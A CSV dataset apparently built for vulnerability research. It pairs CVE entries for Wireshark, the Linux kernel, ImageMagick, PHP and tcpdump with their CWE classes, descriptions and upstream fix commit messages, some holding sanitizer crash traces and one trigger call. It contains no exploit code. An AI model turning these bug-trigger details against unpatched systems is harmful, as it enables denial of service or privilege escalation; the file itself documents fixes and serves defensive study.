cveID,cweID,publishedDate,cveDescription,commitMsg
CVE-2016-5354,CWE-476,2016-08-07,"The USB subsystem in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles class types, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.",USB dissectors can't assume that only their class type has been passed around in the conversation.  Make explicit check that class type expected matches the dissector and stop/prevent dissection if there isn't a match.  Bug: 12356 Change-Id: Ib23973a4ebd0fbb51952ffc118daf95e3389a209 Reviewed-on: https://code.wireshark.org/review/15212 Petri-Dish: Michael Mann <mmann78@netscape.net> Reviewed-by: Martin Kaiser <wireshark@kaiser.cx> Petri-Dish: Martin Kaiser <wireshark@kaiser.cx> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>
CVE-2018-10124,CWE-119,2018-04-16,"The kill_something_info function in kernel/signal.c in the Linux kernel before 4.13, when an unspecified architecture and compiler is used, might allow local users to cause a denial of service via an INT_MIN argument.","When running kill(72057458746458112, 0) in userspace I hit the following issue.    UBSAN: Undefined behaviour in kernel/signal.c:1462:11   negation of -2147483648 cannot be represented in type 'int':   CPU: 226 PID: 9849 Comm: test Tainted: G    B          ---- -------   3.10.0-327.53.58.70.x86_64_ubsan+ #116   Hardware name: Huawei Technologies Co., Ltd. RH8100 V3/BC61PBIA, BIOS BLHSV028 11/11/2014   Call Trace:     dump_stack+0x19/0x1b     ubsan_epilogue+0xd/0x50     __ubsan_handle_negate_overflow+0x109/0x14e     SYSC_kill+0x43e/0x4d0     SyS_kill+0xe/0x10     system_call_fastpath+0x16/0x1b  Add code to avoid the UBSAN detection.  [akpm@linux-foundation.org: tweak comment] Link: http://lkml.kernel.org/r/1496670008-59084-1-git-send-email-zhongjiang@huawei.com Signed-off-by: zhongjiang <zhongjiang@huawei.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Michal Hocko <mhocko@kernel.org> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: Xishi Qiu <qiuxishi@huawei.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-7537,CWE-125,2017-04-19,MagickCore/memory.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds access) via a crafted PDB file.,
CVE-2014-2020,CWE-189,2014-02-18,"ext/gd/gd.c in PHP 5.5.x before 5.5.9 does not check data types, which might allow remote attackers to obtain sensitive information by using a (1) string or (2) array data type in place of a numeric data type, as demonstrated by an imagecrop function call with a string for the x dimension value, a different vulnerability than CVE-2013-7226.",And also fixed the bug: arguments are altered after some calls
CVE-2017-16939,CWE-416,2017-11-24,The XFRM dump policy implementation in net/xfrm/xfrm_user.c in the Linux kernel before 4.13.11 allows local users to gain privileges or cause a denial of service (use-after-free) via a crafted SO_RCVBUF setsockopt system call in conjunction with XFRM_MSG_GETPOLICY Netlink messages.,"An independent security researcher, Mohamed Ghannam, has reported this vulnerability to Beyond Security's SecuriTeam Secure Disclosure program.  The xfrm_dump_policy_done function expects xfrm_dump_policy to have been called at least once or it will crash.  This can be triggered if a dump fails because the target socket's receive buffer is full.  This patch fixes it by using the cb->start mechanism to ensure that the initialisation is always done regardless of the buffer situation.  Fixes: 12a169e (""ipsec: Put dumpers on the dump list"") Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>"
CVE-2017-13043,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:decode_multicast_vpn().,"RFC 6514 Section 4.6 defines the structure for Shared Tree Join (6) and Source Tree Join (7) multicast VPN route types. decode_multicast_vpn() didn't implement the Source AS field of that structure properly, adjust the offsets to put it right.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-8067,CWE-787,2017-04-23,"drivers/char/virtio_console.c in the Linux kernel 4.9.x and 4.10.x before 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.",
CVE-2015-8569,CWE-200,2015-12-28,"The (1) pptp_bind and (2) pptp_connect functions in drivers/net/ppp/pptp.c in the Linux kernel through 4.3.3 do not verify an address length, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism via a crafted application.",Reported-by: Dmitry Vyukov <dvyukov@gmail.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2015-0274,CWE-19,2015-03-16,"The XFS implementation in the Linux kernel before 3.15 improperly uses an old size value during remote attribute replacement, which allows local users to cause a denial of service (transaction overrun and data corruption) or possibly gain privileges by leveraging XFS filesystem access.","Commit e461fcb (""xfs: remote attribute lookups require the value length"") passes the remote attribute length in the xfs_da_args structure on lookup so that CRC calculations and validity checking can be performed correctly by related code. This, unfortunately has the side effect of changing the args->valuelen parameter in cases where it shouldn't.  That is, when we replace a remote attribute, the incoming replacement stores the value and length in args->value and args->valuelen, but then the lookup which finds the existing remote attribute overwrites args->valuelen with the length of the remote attribute being replaced. Hence when we go to create the new attribute, we create it of the size of the existing remote attribute, not the size it is supposed to be. When the new attribute is much smaller than the old attribute, this results in a transaction overrun and an ASSERT() failure on a debug kernel:  XFS: Assertion failed: tp->t_blk_res_used <= tp->t_blk_res, file: fs/xfs/xfs_trans.c, line: 331  Fix this by keeping the remote attribute value length separate to the attribute value length in the xfs_da_args structure. The enables us to pass the length of the remote attribute to be removed without overwriting the new attribute's length.  Also, ensure that when we save remote block contexts for a later rename we zero the original state variables so that we don't confuse the state of the attribute to be removes with the state of the new attribute that we just added. [Spotted by Brain Foster.]  Signed-off-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Brian Foster <bfoster@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>"
CVE-2017-6502,CWE-119,2017-03-06,"An issue was discovered in ImageMagick 6.9.7. A specially crafted webp file could lead to a file-descriptor leak in libmagickcore (thus, a DoS).",
CVE-2018-14734,CWE-416,2018-07-29,"drivers/infiniband/core/ucma.c in the Linux kernel through 4.17.11 allows ucma_leave_multicast to access a certain data structure after a cleanup step in ucma_process_join, which allows attackers to cause a denial of service (use-after-free).","ucma_process_join() will free the new allocated ""mc"" struct, if there is any error after that, especially the copy_to_user().  But in parallel, ucma_leave_multicast() could find this ""mc"" through idr_find() before ucma_process_join() frees it, since it is already published.  So ""mc"" could be used in ucma_leave_multicast() after it is been allocated and freed in ucma_process_join(), since we don't refcnt it.  Fix this by separating ""publish"" from ID allocation, so that we can get an ID first and publish it later after copy_to_user().  Fixes: c8f6a36 (""RDMA/cma: Add multicast communication support"") Reported-by: Noam Rathaus <noamr@beyondsecurity.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: Jason Gunthorpe <jgg@mellanox.com>"
CVE-2016-7914,CWE-125,2016-11-16,"The assoc_array_insert_into_terminal_node function in lib/assoc_array.c in the Linux kernel before 4.5.3 does not check whether a slot is a leaf, which allows local users to obtain sensitive information from kernel memory or cause a denial of service (invalid pointer dereference and out-of-bounds read) via an application that uses associative-array data structures, as demonstrated by the keyutils test suite.","Changes since V1: fixed the description and added KASan warning.  In assoc_array_insert_into_terminal_node(), we call the compare_object() method on all non-empty slots, even when they're not leaves, passing a pointer to an unexpected structure to compare_object(). Currently it causes an out-of-bound read access in keyring_compare_object detected by KASan (see below). The issue is easily reproduced with keyutils testsuite. Only call compare_object() when the slot is a leave.  KASan warning: ================================================================== BUG: KASAN: slab-out-of-bounds in keyring_compare_object+0x213/0x240 at addr ffff880060a6f838 Read of size 8 by task keyctl/1655 ============================================================================= BUG kmalloc-192 (Not tainted): kasan: bad access detected -----------------------------------------------------------------------------  Disabling lock debugging due to kernel taint INFO: Allocated in assoc_array_insert+0xfd0/0x3a60 age=69 cpu=1 pid=1647 	___slab_alloc+0x563/0x5c0 	__slab_alloc+0x51/0x90 	kmem_cache_alloc_trace+0x263/0x300 	assoc_array_insert+0xfd0/0x3a60 	__key_link_begin+0xfc/0x270 	key_create_or_update+0x459/0xaf0 	SyS_add_key+0x1ba/0x350 	entry_SYSCALL_64_fastpath+0x12/0x76 INFO: Slab 0xffffea0001829b80 objects=16 used=8 fp=0xffff880060a6f550 flags=0x3fff8000004080 INFO: Object 0xffff880060a6f740 @offset=5952 fp=0xffff880060a6e5d1  Bytes b4 ffff880060a6f730: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f740: d1 e5 a6 60 00 88 ff ff 0e 00 00 00 00 00 00 00  ...`............ Object ffff880060a6f750: 02 cf 8e 60 00 88 ff ff 02 c0 8e 60 00 88 ff ff  ...`.......`.... Object ffff880060a6f760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f770: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7d0: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ CPU: 0 PID: 1655 Comm: keyctl Tainted: G    B           4.5.0-rc4-kasan+ #291 Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011  0000000000000000 000000001b2800b4 ffff880060a179e0 ffffffff81b60491  ffff88006c802900 ffff880060a6f740 ffff880060a17a10 ffffffff815e2969  ffff88006c802900 ffffea0001829b80 ffff880060a6f740 ffff880060a6e650 Call Trace:  [<ffffffff81b60491>] dump_stack+0x85/0xc4  [<ffffffff815e2969>] print_trailer+0xf9/0x150  [<ffffffff815e9454>] object_err+0x34/0x40  [<ffffffff815ebe50>] kasan_report_error+0x230/0x550  [<ffffffff819949be>] ? keyring_get_key_chunk+0x13e/0x210  [<ffffffff815ec62d>] __asan_report_load_n_noabort+0x5d/0x70  [<ffffffff81994cc3>] ? keyring_compare_object+0x213/0x240  [<ffffffff81994cc3>] keyring_compare_object+0x213/0x240  [<ffffffff81bc238c>] assoc_array_insert+0x86c/0x3a60  [<ffffffff81bc1b20>] ? assoc_array_cancel_edit+0x70/0x70  [<ffffffff8199797d>] ? __key_link_begin+0x20d/0x270  [<ffffffff8199786c>] __key_link_begin+0xfc/0x270  [<ffffffff81993389>] key_create_or_update+0x459/0xaf0  [<ffffffff8128ce0d>] ? trace_hardirqs_on+0xd/0x10  [<ffffffff81992f30>] ? key_type_lookup+0xc0/0xc0  [<ffffffff8199e19d>] ? lookup_user_key+0x13d/0xcd0  [<ffffffff81534763>] ? memdup_user+0x53/0x80  [<ffffffff819983ea>] SyS_add_key+0x1ba/0x350  [<ffffffff81998230>] ? key_get_type_from_user.constprop.6+0xa0/0xa0  [<ffffffff828bcf4e>] ? retint_user+0x18/0x23  [<ffffffff8128cc7e>] ? trace_hardirqs_on_caller+0x3fe/0x580  [<ffffffff81004017>] ? trace_hardirqs_on_thunk+0x17/0x19  [<ffffffff828bc432>] entry_SYSCALL_64_fastpath+0x12/0x76 Memory state around the buggy address:  ffff880060a6f700: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00  ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc fc >ffff880060a6f800: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc                                         ^  ffff880060a6f880: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc  ffff880060a6f900: fc fc fc fc fc fc 00 00 00 00 00 00 00 00 00 00 ==================================================================  Signed-off-by: Jerome Marchand <jmarchan@redhat.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: stable@vger.kernel.org"
